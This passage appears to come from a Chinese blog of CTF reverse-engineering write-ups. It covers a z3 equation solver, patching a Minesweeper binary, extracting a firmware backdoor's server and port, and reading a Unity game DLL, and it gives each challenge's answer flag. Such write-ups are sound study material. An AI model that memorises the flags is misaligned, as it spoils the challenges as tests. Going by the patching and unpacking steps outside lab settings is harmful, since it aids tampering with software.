class="number">17</span>]+l[<span class="number">31</span>]-l[<span class="number">22</span>]-l[<span class="number">35</span>]+l[<span class="number">5</span>]-l[<span class="number">1</span>]==-<span class="number">480</span>)</span><br><span class="line">s.add(l[<span class="number">36</span>]-l[<span class="number">11</span>]-l[<span class="number">34</span>]+l[<span class="number">8</span>]+l[<span class="number">0</span>]+l[<span class="number">15</span>]+l[<span class="number">28</span>]-l[<span class="number">39</span>]-l[<span class="number">32</span>]-l[<span class="number">2</span>]-l[<span class="number">27</span>]+l[<span class="number">22</span>]+l[<span class="number">16</span>]-l[<span class="number">30</span>]-l[<span class="number">3</span>]+l[<span class="number">31</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]+l[<span class="number">17</span>]-l[<span class="number">29</span>]-l[<span class="number">18</span>]+l[<span class="number">19</span>]-l[<span class="number">10</span>]+l[<span class="number">6</span>]-l[<span class="number">5</span>]-l[<span class="number">38</span>]-l[<span class="number">25</span>]-l[<span class="number">24</span>]+l[<span class="number">4</span>]+l[<span class="number">23</span>]+l[<span class="number">9</span>]+l[<span class="number">14</span>]+l[<span class="number">21</span>]-l[<span class="number">37</span>]+l[<span class="number">13</span>]-l[<span class="number">41</span>]-l[<span class="number">12</span>]+l[<span class="number">35</span>]==-<span class="number">213</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]-l[<span class="number">36</span>]-l[<span class="number">12</span>]+l[<span class="number">33</span>]-l[<span class="number">27</span>]-l[<span class="number">37</span>]-l[<span class="number">25</span>]+l[<span class="number">38</span>]+l[<span class="number">16</span>]-l[<span class="number">18</span>]+l[<span class="number">22</span>]-l[<span class="number">39</span>]+l[<span class="number">13</span>]-l[<span class="number">7</span>]-l[<span class="number">31</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">10</span>]-l[<span class="number">9</span>]-l[<span class="number">2</span>]-l[<span class="number">30</span>]-l[<span class="number">11</span>]+l[<span class="number">41</span>]-l[<span class="number">4</span>]+l[<span class="number">24</span>]+l[<span class="number">34</span>]+l[<span class="number">5</span>]+l[<span class="number">17</span>]+l[<span class="number">14</span>]+l[<span class="number">6</span>]+l[<span class="number">8</span>]-l[<span class="number">21</span>]-l[<span class="number">23</span>]+l[<span class="number">32</span>]-l[<span class="number">1</span>]-l[<span class="number">29</span>]-l[<span class="number">0</span>]+l[<span class="number">3</span>]==-<span class="number">386</span>)</span><br><span class="line">s.add(l[<span class="number">0</span>]+l[<span class="number">7</span>]-l[<span class="number">28</span>]-l[<span class="number">38</span>]+l[<span class="number">19</span>]+l[<span class="number">31</span>]-l[<span class="number">5</span>]+l[<span class="number">24</span>]-l[<span class="number">3</span>]+l[<span class="number">33</span>]-l[<span class="number">12</span>]-l[<span class="number">29</span>]+l[<span class="number">32</span>]+l[<span class="number">1</span>]-l[<span class="number">34</span>]-l[<span class="number">9</span>]-l[<span class="number">25</span>]+l[<span class="number">26</span>]-l[<span class="number">8</span>]+l[<span class="number">4</span>]-l[<span class="number">10</span>]+l[<span class="number">40</span>]-l[<span class="number">15</span>]-l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">36</span>]+l[<span class="number">14</span>]+l[<span class="number">41</span>]-l[<span class="number">35</span>]-l[<span class="number">13</span>]-l[<span class="number">17</span>]-l[<span class="number">21</span>]-l[<span class="number">18</span>]+l[<span class="number">39</span>]-l[<span class="number">2</span>]+l[<span class="number">20</span>]-l[<span class="number">23</span>]-l[<span class="number">22</span>]==-<span class="number">349</span>)</span><br><span class="line">s.add(l[<span class="number">10</span>]+l[<span class="number">22</span>]+l[<span class="number">21</span>]-l[<span class="number">0</span>]+l[<span class="number">15</span>]-l[<span class="number">6</span>]+l[<span class="number">20</span>]-l[<span class="number">29</span>]-l[<span class="number">30</span>]-l[<span class="number">33</span>]+l[<span class="number">19</span>]+l[<span class="number">23</span>]-l[<span class="number">28</span>]+l[<span class="number">41</span>]-l[<span class="number">27</span>]-l[<span class="number">12</span>]-l[<span class="number">37</span>]-l[<span class="number">32</span>]+l[<span class="number">34</span>]-l[<span class="number">36</span>]+l[<span class="number">3</span>]+l[<span class="number">1</span>]-l[<span class="number">13</span>]+l[<span class="number">18</span>]+l[<span class="number">14</span>]+l[<span class="number">9</span>]+l[<span class="number">7</span>]-l[<span class="number">39</span>]+l[<span class="number">8</span>]+l[<span class="number">2</span>]-l[<span class="number">31</span>]-l[<span class="number">5</span>]-l[<span class="number">40</span>]+l[<span class="number">38</span>]-l[<span class="number">26</span>]-l[<span class="number">4</span>]+l[<span class="number">16</span>]-l[<span class="number">25</span>]==<span class="number">98</span>)</span><br><span class="line">s.add(l[<span class="number">28</span>]+l[<span class="number">38</span>]+l[<span class="number">20</span>]+l[<span class="number">0</span>]-l[<span class="number">5</span>]-l[<span class="number">34</span>]-l[<span class="number">41</span>]+l[<span class="number">22</span>]-l[<span class="number">26</span>]+l[<span class="number">11</span>]+l[<span class="number">29</span>]+l[<span class="number">31</span>]-l[<span class="number">3</span>]-l[<span class="number">16</span>]+l[<span class="number">23</span>]+l[<span class="number">17</span>]-l[<span class="number">18</span>]+l[<span class="number">9</span>]-l[<span class="number">4</span>]-l[<span class="number">12</span>]-l[<span class="number">19</span>]-l[<span class="number">40</span>]-l[<span class="number">27</span>]+l[<span class="number">33</span>]+l[<span class="number">8</span>]-l[<span class="number">37</span>]+l[<span class="number">2</span>]+l[<span class="number">15</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]+l[<span class="number">10</span>]+l[<span class="number">35</span>]-l[<span class="number">1</span>]+l[<span class="number">30</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]-l[<span class="number">14</span>]-l[<span class="number">32</span>]==-<span class="number">412</span>)</span><br><span class="line">s.add(l[<span class="number">1</span>]-l[<span class="number">24</span>]-l[<span class="number">29</span>]+l[<span class="number">39</span>]+l[<span class="number">41</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]-l[<span class="number">19</span>]+l[<span class="number">6</span>]-l[<span class="number">37</span>]-l[<span class="number">22</span>]+l[<span class="number">32</span>]+l[<span class="number">21</span>]+l[<span class="number">28</span>]+l[<span class="number">36</span>]+l[<span class="number">4</span>]-l[<span class="number">17</span>]+l[<span class="number">20</span>]-l[<span class="number">13</span>]-l[<span class="number">35</span>]-l[<span class="number">5</span>]+l[<span class="number">33</span>]-l[<span class="number">27</span>]-l[<span class="number">30</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]-l[<span class="number">18</span>]+l[<span class="number">34</span>]-l[<span class="number">3</span>]-l[<span class="number">10</span>]-l[<span class="number">16</span>]-l[<span class="number">23</span>]-l[<span class="number">38</span>]+l[<span class="number">8</span>]-l[<span class="number">14</span>]-l[<span class="number">11</span>]-l[<span class="number">7</span>]+l[<span class="number">12</span>]==-<span class="number">95</span>)</span><br><span class="line">s.add(l[<span class="number">2</span>]-l[<span class="number">24</span>]+l[<span class="number">31</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]-l[<span class="number">6</span>]+l[<span class="number">7</span>]-l[<span class="number">1</span>]-l[<span class="number">22</span>]+l[<span class="number">8</span>]-l[<span class="number">23</span>]+l[<span class="number">40</span>]+l[<span class="number">20</span>]-l[<span class="number">38</span>]-l[<span class="number">11</span>]-l[<span class="number">14</span>]+l[<span class="number">18</span>]-l[<span class="number">36</span>]+l[<span class="number">15</span>]-l[<span class="number">4</span>]-l[<span class="number">41</span>]-l[<span class="number">12</span>]-l[<span class="number">34</span>]+l[<span class="number">32</span>]-l[<span class="number">35</span>]+l[<span class="number">17</span>]-l[<span class="number">21</span>]-l[<span class="number">10</span>]-l[<span class="number">29</span>]+l[<span class="number">39</span>]-l[<span class="number">16</span>]+l[<span class="number">27</span>]+l[<span class="number">26</span>]-l[<span class="number">3</span>]-l[<span class="number">5</span>]+l[<span class="number">13</span>]+l[<span class="number">25</span>]-l[<span class="number">28</span>]==-<span class="number">379</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]-l[<span class="number">17</span>]+l[<span class="number">31</span>]+l[<span class="number">14</span>]+l[<span class="number">6</span>]-l[<span class="number">12</span>]+l[<span class="number">16</span>]-l[<span class="number">8</span>]+l[<span class="number">27</span>]-l[<span class="number">13</span>]+l[<span class="number">41</span>]+l[<span class="number">2</span>]-l[<span class="number">7</span>]+l[<span class="number">32</span>]+l[<span class="number">1</span>]+l[<span class="number">25</span>]-l[<span class="number">9</span>]+l[<span class="number">37</span>]+l[<span class="number">34</span>]-l[<span class="number">18</span>]-l[<span class="number">40</span>]-l[<span class="number">11</span>]-l[<span class="number">10</span>]+l[<span class="number">38</span>]+l[<span class="number">21</span>]+l[<span class="number">3</span>]-l[<span class="number">0</span>]+l[<span class="number">24</span>]+l[<span class="number">15</span>]+l[<span class="number">23</span>]-l[<span class="number">20</span>]+l[<span class="number">26</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">28</span>]-l[<span class="number">5</span>]+l[<span class="number">39</span>]+l[<span class="number">35</span>]==<span class="number">861</span>)</span><br><span class="line">s.add(l[<span class="number">35</span>]+l[<span class="number">36</span>]-l[<span class="number">16</span>]-l[<span class="number">26</span>]-l[<span class="number">31</span>]+l[<span class="number">0</span>]+l[<span class="number">21</span>]-l[<span class="number">13</span>]+l[<span class="number">14</span>]+l[<span class="number">39</span>]+l[<span class="number">7</span>]+l[<span class="number">4</span>]+l[<span class="number">34</span>]+l[<span class="number">38</span>]+l[<span class="number">17</span>]+l[<span class="number">22</span>]+l[<span class="number">32</span>]+l[<span class="number">5</span>]+l[<span class="number">15</span>]+l[<span class="number">8</span>]-l[<span class="number">29</span>]+l[<span class="number">40</span>]+l[<span class="number">24</span>]+l[<span class="number">6</span>]+l[<span class="number">30</span>]-l[<span class="number">2</span>]+l[<span class="number">25</span>]+l[<span class="number">23</span>]+l[<span class="number">1</span>]+l[<span class="number">12</span>]+l[<span class="number">9</span>]-l[<span class="number">10</span>]-l[<span class="number">3</span>]-l[<span class="number">19</span>]+l[<span class="number">20</span>]-l[<span class="number">37</span>]-l[<span class="number">33</span>]-l[<span class="number">18</span>]==<span class="number">1169</span>)</span><br><span class="line">s.add(l[<span class="number">13</span>]+l[<span class="number">0</span>]-l[<span class="number">25</span>]-l[<span class="number">32</span>]-l[<span class="number">21</span>]-l[<span class="number">34</span>]-l[<span class="number">14</span>]-l[<span class="number">9</span>]-l[<span class="number">8</span>]-l[<span class="number">15</span>]-l[<span class="number">16</span>]+l[<span class="number">38</span>]-l[<span class="number">35</span>]-l[<span class="number">30</span>]-l[<span class="number">40</span>]-l[<span class="number">12</span>]+l[<span class="number">3</span>]-l[<span class="number">19</span>]+l[<span class="number">4</span>]-l[<span class="number">41</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]+l[<span class="number">37</span>]+l[<span class="number">17</span>]-l[<span class="number">1</span>]+l[<span class="number">26</span>]-l[<span class="number">39</span>]-l[<span class="number">10</span>]-l[<span class="number">33</span>]+l[<span class="number">5</span>]-l[<span class="number">27</span>]-l[<span class="number">23</span>]-l[<span class="number">24</span>]-l[<span class="number">7</span>]+l[<span class="number">31</span>]-l[<span class="number">28</span>]-l[<span class="number">18</span>]+l[<span class="number">6</span>]==-<span class="number">1236</span>)</span><br><span class="line">s.add(l[<span class="number">20</span>]+l[<span class="number">27</span>]-l[<span class="number">29</span>]-l[<span class="number">25</span>]-l[<span class="number">3</span>]+l[<span class="number">28</span>]-l[<span class="number">32</span>]-l[<span class="number">11</span>]+l[<span class="number">10</span>]+l[<span class="number">31</span>]+l[<span class="number">16</span>]+l[<span class="number">21</span>]-l[<span class="number">7</span>]+l[<span class="number">4</span>]-l[<span class="number">24</span>]-l[<span class="number">35</span>]+l[<span class="number">26</span>]+l[<span class="number">12</span>]-l[<span class="number">37</span>]+l[<span class="number">6</span>]+l[<span class="number">23</span>]+l[<span class="number">41</span>]-l[<span class="number">39</span>]-l[<span class="number">38</span>]+l[<span class="number">40</span>]-l[<span class="number">36</span>]+l[<span class="number">8</span>]-l[<span class="number">9</span>]-l[<span class="number">5</span>]-l[<span class="number">1</span>]-l[<span class="number">13</span>]-l[<span class="number">14</span>]+l[<span class="number">19</span>]+l[<span class="number">0</span>]-l[<span class="number">34</span>]-l[<span class="number">15</span>]+l[<span class="number">17</span>]+l[<span class="number">22</span>]==-<span class="number">114</span>)</span><br><span class="line">s.add(l[<span class="number">12</span>]-l[<span class="number">28</span>]-l[<span class="number">13</span>]-l[<span class="number">23</span>]-l[<span class="number">33</span>]+l[<span class="number">18</span>]+l[<span class="number">10</span>]+l[<span class="number">11</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]+l[<span class="number">41</span>]-l[<span class="number">16</span>]+l[<span class="number">39</span>]+l[<span class="number">34</span>]+l[<span class="number">32</span>]+l[<span class="number">37</span>]-l[<span class="number">38</span>]+l[<span class="number">20</span>]+l[<span class="number">6</span>]+l[<span class="number">7</span>]+l[<span class="number">31</span>]+l[<span class="number">5</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">15</span>]-l[<span class="number">24</span>]+l[<span class="number">17</span>]-l[<span class="number">3</span>]+l[<span class="number">1</span>]-l[<span class="number">35</span>]-l[<span class="number">9</span>]+l[<span class="number">30</span>]+l[<span class="number">25</span>]-l[<span class="number">0</span>]-l[<span class="number">8</span>]-l[<span class="number">14</span>]+l[<span class="number">26</span>]+l[<span class="number">21</span>]==<span class="number">659</span>)</span><br><span class="line">s.add(l[<span class="number">21</span>]-l[<span class="number">3</span>]+l[<span class="number">7</span>]-l[<span class="number">27</span>]+l[<span class="number">0</span>]-l[<span class="number">32</span>]-l[<span class="number">24</span>]-l[<span class="number">37</span>]+l[<span class="number">4</span>]-l[<span class="number">22</span>]+l[<span class="number">20</span>]-l[<span class="number">5</span>]-l[<span class="number">30</span>]-l[<span class="number">31</span>]-l[<span class="number">1</span>]+l[<span class="number">15</span>]+l[<span class="number">41</span>]+l[<span class="number">12</span>]+l[<span class="number">40</span>]+l[<span class="number">38</span>]-l[<span class="number">17</span>]-l[<span class="number">39</span>]+l[<span class="number">19</span>]-l[<span class="number">13</span>]+l[<span class="number">23</span>]+l[<span class="number">18</span>]-l[<span class="number">2</span>]+l[<span class="number">6</span>]-l[<span class="number">33</span>]-l[<span class="number">9</span>]+l[<span class="number">28</span>]+l[<span class="number">8</span>]-l[<span class="number">16</span>]-l[<span class="number">10</span>]-l[<span class="number">14</span>]+l[<span class="number">34</span>]+l[<span class="number">35</span>]-l[<span class="number">11</span>]==-<span class="number">430</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]-l[<span class="number">23</span>]-l[<span class="number">9</span>]-l[<span class="number">19</span>]+l[<span class="number">17</span>]+l[<span class="number">38</span>]-l[<span class="number">36</span>]-l[<span class="number">22</span>]-l[<span class="number">10</span>]+l[<span class="number">27</span>]-l[<span class="number">14</span>]-l[<span class="number">4</span>]+l[<span class="number">5</span>]+l[<span class="number">31</span>]+l[<span class="number">2</span>]+l[<span class="number">0</span>]-l[<span class="number">16</span>]-l[<span class="number">8</span>]-l[<span class="number">28</span>]+l[<span class="number">3</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]-l[<span class="number">33</span>]+l[<span class="number">13</span>]-l[<span class="number">32</span>]-l[<span class="number">35</span>]+l[<span class="number">26</span>]-l[<span class="number">20</span>]-l[<span class="number">41</span>]-l[<span class="number">30</span>]-l[<span class="number">12</span>]-l[<span class="number">7</span>]+l[<span class="number">37</span>]-l[<span class="number">39</span>]+l[<span class="number">15</span>]+l[<span class="number">18</span>]-l[<span class="number">29</span>]-l[<span class="number">21</span>]==-<span class="number">513</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">4</span>]-l[<span class="number">13</span>]-l[<span class="number">17</span>]-l[<span class="number">30</span>]+l[<span class="number">5</span>]-l[<span class="number">33</span>]-l[<span class="number">37</span>]-l[<span class="number">15</span>]-l[<span class="number">18</span>]+l[<span class="number">7</span>]+l[<span class="number">25</span>]-l[<span class="number">14</span>]+l[<span class="number">35</span>]+l[<span class="number">40</span>]+l[<span class="number">16</span>]+l[<span class="number">1</span>]+l[<span class="number">2</span>]+l[<span class="number">26</span>]-l[<span class="number">3</span>]-l[<span class="number">39</span>]-l[<span class="number">22</span>]+l[<span class="number">23</span>]-l[<span class="number">36</span>]-l[<span class="number">27</span>]-l[<span class="number">9</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]-l[<span class="number">0</span>]-l[<span class="number">31</span>]-l[<span class="number">20</span>]+l[<span class="number">12</span>]-l[<span class="number">8</span>]+l[<span class="number">29</span>]-l[<span class="number">11</span>]-l[<span class="number">34</span>]+l[<span class="number">21</span>]==-<span class="number">502</span>)</span><br><span class="line">s.add(l[<span class="number">30</span>]-l[<span class="number">31</span>]-l[<span class="number">36</span>]+l[<span class="number">3</span>]+l[<span class="number">9</span>]-l[<span class="number">40</span>]-l[<span class="number">33</span>]+l[<span class="number">25</span>]+l[<span class="number">39</span>]-l[<span class="number">26</span>]+l[<span class="number">23</span>]-l[<span class="number">0</span>]-l[<span class="number">29</span>]-l[<span class="number">32</span>]-l[<span class="number">4</span>]+l[<span class="number">37</span>]+l[<span class="number">28</span>]+l[<span class="number">21</span>]+l[<span class="number">17</span>]+l[<span class="number">2</span>]+l[<span class="number">24</span>]+l[<span class="number">6</span>]+l[<span class="number">5</span>]+l[<span class="number">8</span>]+l[<span class="number">16</span>]+l[<span class="number">27</span>]+l[<span class="number">19</span>]+l[<span class="number">12</span>]+l[<span class="number">20</span>]+l[<span class="number">41</span>]-l[<span class="number">22</span>]+l[<span class="number">15</span>]-l[<span class="number">11</span>]+l[<span class="number">34</span>]-l[<span class="number">18</span>]-l[<span class="number">38</span>]+l[<span class="number">1</span>]-l[<span class="number">14</span>]==<span class="number">853</span>)</span><br><span class="line">s.add(l[<span class="number">38</span>]-l[<span class="number">10</span>]+l[<span class="number">16</span>]+l[<span class="number">8</span>]+l[<span class="number">21</span>]-l[<span class="number">25</span>]+l[<span class="number">36</span>]-l[<span class="number">30</span>]+l[<span class="number">31</span>]-l[<span class="number">3</span>]+l[<span class="number">5</span>]-l[<span class="number">15</span>]+l[<span class="number">23</span>]-l[<span class="number">28</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">29</span>]+l[<span class="number">22</span>]-l[<span class="number">0</span>]-l[<span class="number">37</span>]-l[<span class="number">14</span>]-l[<span class="number">11</span>]+l[<span class="number">32</span>]+l[<span class="number">33</span>]-l[<span class="number">9</span>]+l[<span class="number">39</span>]+l[<span class="number">41</span>]-l[<span class="number">19</span>]-l[<span class="number">1</span>]+l[<span class="number">18</span>]-l[<span class="number">4</span>]-l[<span class="number">6</span>]+l[<span class="number">13</span>]+l[<span class="number">20</span>]-l[<span class="number">2</span>]-l[<span class="number">35</span>]-l[<span class="number">26</span>]+l[<span class="number">27</span>]==-<span class="number">28</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]+l[<span class="number">18</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">14</span>]-l[<span class="number">33</span>]+l[<span class="number">7</span>]-l[<span class="number">23</span>]-l[<span class="number">25</span>]+l[<span class="number">0</span>]-l[<span class="number">6</span>]-l[<span class="number">21</span>]-l[<span class="number">16</span>]+l[<span class="number">17</span>]-l[<span class="number">19</span>]-l[<span class="number">28</span>]-l[<span class="number">38</span>]-l[<span class="number">37</span>]+l[<span class="number">9</span>]+l[<span class="number">20</span>]-l[<span class="number">8</span>]-l[<span class="number">3</span>]+l[<span class="number">22</span>]-l[<span class="number">35</span>]-l[<span class="number">10</span>]-l[<span class="number">31</span>]-l[<span class="number">2</span>]+l[<span class="number">41</span>]-l[<span class="number">1</span>]-l[<span class="number">4</span>]+l[<span class="number">24</span>]-l[<span class="number">34</span>]+l[<span class="number">39</span>]+l[<span class="number">40</span>]+l[<span class="number">32</span>]-l[<span class="number">5</span>]+l[<span class="number">36</span>]-l[<span class="number">27</span>]==-<span class="number">529</span>)</span><br><span class="line">s.add(l[<span class="number">38</span>]+l[<span class="number">8</span>]+l[<span class="number">36</span>]+l[<span class="number">35</span>]-l[<span class="number">23</span>]-l[<span class="number">34</span>]+l[<span class="number">13</span>]-l[<span class="number">4</span>]-l[<span class="number">27</span>]-l[<span class="number">24</span>]+l[<span class="number">26</span>]+l[<span class="number">31</span>]-l[<span class="number">30</span>]-l[<span class="number">5</span>]-l[<span class="number">40</span>]+l[<span class="number">28</span>]-l[<span class="number">11</span>]-l[<span class="number">2</span>]-l[<span class="number">39</span>]+l[<span class="number">15</span>]+l[<span class="number">10</span>]-l[<span class="number">17</span>]+l[<span class="number">3</span>]+l[<span class="number">19</span>]+l[<span class="number">22</span>]+l[<span class="number">33</span>]+l[<span class="number">0</span>]+l[<span class="number">37</span>]+l[<span class="number">16</span>]-l[<span class="number">9</span>]-l[<span class="number">32</span>]+l[<span class="number">25</span>]-l[<span class="number">21</span>]-l[<span class="number">12</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]==-<span class="number">12</span>)</span><br><span class="line">s.add(l[<span class="number">6</span>]-l[<span class="number">30</span>]-l[<span class="number">20</span>]-l[<span class="number">27</span>]-l[<span class="number">14</span>]-l[<span class="number">39</span>]+l[<span class="number">41</span>]-l[<span class="number">33</span>]-l[<span class="number">0</span>]+l[<span class="number">25</span>]-l[<span class="number">32</span>]-l[<span class="number">3</span>]+l[<span class="number">26</span>]-l[<span class="number">12</span>]+l[<span class="number">8</span>]-l[<span class="number">35</span>]-l[<span class="number">24</span>]+l[<span class="number">15</span>]+l[<span class="number">9</span>]-l[<span class="number">4</span>]+l[<span class="number">13</span>]+l[<span class="number">36</span>]+l[<span class="number">34</span>]+l[<span class="number">1</span>]-l[<span class="number">28</span>]-l[<span class="number">21</span>]+l[<span class="number">18</span>]+l[<span class="number">23</span>]+l[<span class="number">29</span>]-l[<span class="number">10</span>]-l[<span class="number">38</span>]+l[<span class="number">22</span>]+l[<span class="number">37</span>]+l[<span class="number">5</span>]+l[<span class="number">19</span>]+l[<span class="number">7</span>]+l[<span class="number">16</span>]-l[<span class="number">31</span>]==<span class="number">81</span>)</span><br><span class="line"></span><br><span class="line">check=s.check()</span><br><span class="line"><span class="built_in">print</span>(check)</span><br><span class="line">model = s.model()</span><br><span class="line"><span class="built_in">print</span>(model)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span>%(model[l[i]]))),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>得到<strong> flag {A_l0ng_10NG_eqU4Ti0n_1s_E4Sy_W1Th_z3}</strong></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UltimateMinesweeper</title>
      <link href="/2022/07/05/UltimateMinesweeper/"/>
      <url>/2022/07/05/UltimateMinesweeper/</url>
      
        <content type="html"><![CDATA[<p>这是个游戏题，打开之后就是个扫雷，估计是排完雷就可以显示 flag 了，然后用 dnSpy 打开文件之后，感觉这个 GetKey 是关键函数，因为出现了一个数组，这里估计就是 flag 了，而且肯定有一些算法在里面，感觉可以通过脚本逆向出来（做完之后看别人的 wp 原来这里也无法用脚本逆出来，因为少了一个数组的数据）</p><img src="/2022/07/05/UltimateMinesweeper/1.png" class><p>但是在查壳的时候知道了这个程序使用 C# 写的，是在看不太懂，最多分析个大概的思路，就只能去猜它的意思，所以还是换个思路，就改一下里面的代码，看能不能强制通关之类的，然后我看到了这个函数</p><img src="/2022/07/05/UltimateMinesweeper/2.png" class><p>这里引用了 GetKey 函数，肯定是个关键点，而且这个 if 语句里面包含了 Application.Exit () 函数，这是用来退出程序的函数，估计就是不符合条件了也就是踩雷了就退出程序，所以我就把这两个 if 语句全删掉了，然后再编译并另存为新的程序，发现真的踩雷也不会挂了，所以就一直无敌</p><p>但是这个真的好难点，我一开始点的时候点累了，感觉有更好的方法，点到一半就关掉了，白点了那么多下好烦啊（后面看别人的 wp 的时候发现居然有人可以开透视挂，简直不要太爽，比无敌挂好用多了，不用点那么多下）</p><img src="/2022/07/05/UltimateMinesweeper/3.png" class><p>但是后来实在是想不出别的方法了（论精通各种编程语言的重要性，如果能看懂 C# 肯定会好做些），就还是老实地全点完了，刚点完发现给的答案是个乱码</p><img src="/2022/07/05/UltimateMinesweeper/4.png" class><p>到原来那个没被修改过的程序找到相应的位置才是真的 flag</p><img src="/2022/07/05/UltimateMinesweeper/5.png" class><p>得到<strong> flag {Ch3aters_Alw4ys_W1n@flare-on.com}</strong></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>firmware</title>
      <link href="/2022/07/05/firmware/"/>
      <url>/2022/07/05/firmware/</url>
      
        <content type="html"><![CDATA[<p>这个题刚开始就提示了我们要分析后门程序的服务器和端口，所以我们的目的就是要去找到后门程序，并且拿到服务器和端口，最后再 md5 加密一下就是我们的 flag 了。</p><p>在拿到题目之后，发现是个 bin 文件，上网查了一下，要用 binwalk 工具去提取里面的文件，</p><img src="/2022/07/05/firmware/1.png" class><p>提取之后发现前面几个文件打开之后什么都没有，也没有所谓的后门文件，就剩一个 120200.squashfs 文件，这个东西我怎么都打不开，然后查了一下，原来它要用 firmware-mod-kit 来解压，才能提取里面的文件，把工具装好之后，解压，然后终于找到了一个 backdoor 文件，这应该就是后门文件了</p><img src="/2022/07/05/firmware/2.png" class><p>然后检查一下这个后门程序，发现还有个 upx 的壳，那我们就脱壳</p><img src="/2022/07/05/firmware/3.png" class><p>脱壳之后用 ida 打开，shift+F12 搜索字符串，看到一个网址</p><img src="/2022/07/05/firmware/4.png" class><p>这应该就是 flag 的前一部分了，而剩下的端口应该就是一串数字了，找了一会在这里发现一段可疑代码</p><img src="/2022/07/05/firmware/5.png" class><p>18 行 - 23 行是关键代码，根据题目给的提示，flag 加密前的形式是 (网址：端口) 的格式，而这里刚好出现了冒号，并且将冒号后面的数据整型化后赋给 v3，所以就是端口的值，这里的话 v3=36667 应该就是它默认的端口值，所以 36667 就是我们需要的端口，<a href="http://xn--echo-uq9f12jp7ffzl1twsyctq4dqcwmz4b89gqo4a.byethost51.com:36667">和前面的网址连起来就是 echo.byethost51.com:36667</a>，MD5 一下就是我们的 flag 了</p><img src="/2022/07/05/firmware/6.png" class><p>得到<strong> flag {33a422c45d551ac6e4756f59812a954b}</strong></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020-PixelShooter</title>
      <link href="/2022/07/03/MRCTF2020-PixelShooter/"/>
      <url>/2022/07/03/MRCTF2020-PixelShooter/</url>
      
        <content type="html"><![CDATA[<p>这是一道安卓逆向，而且是一个游戏题，可以用模拟器打开玩通关，不过一开始我还是习惯性地用 android killer 打开看 java 代码，一直找不到关键函数，然后突然想起之前做过类似的题目，这种游戏题一般是基于 unity 开发的，而且它的核心逻辑位于 assets\bin\Data\Managed\Assembly-CSharp.dll，所以我把它里面的 Assembly-CSharp.dll 文件提取出来之后，再用 dnSpy 打开，然后找到它的关键函数，但没想到的是 flag 直接就可以看到…</p><img src="/2022/07/03/MRCTF2020-PixelShooter/1.png" class><p>后面又在网上搜了一下这道题，发现还有一个工具也就是 JEB 可以来做这类题，然后我就下了一个试试</p><img src="/2022/07/03/MRCTF2020-PixelShooter/2.png" class><p>个人感觉 dnSpy 更好用哈哈哈哈</p><p>flag：<strong>MRCTF{Unity_1S_Fun_233}</strong></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019-simpleCPP</title>
      <link href="/2022/07/02/GXYCTF2019-simpleCPP/"/>
      <url>/2022/07/02/GXYCTF2019-simpleCPP/</url>
      
        <content type="html"><![CDATA[<h1 id="主函数"><a class="markdownIt-Anchor" href="#主函数">#</a> 主函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 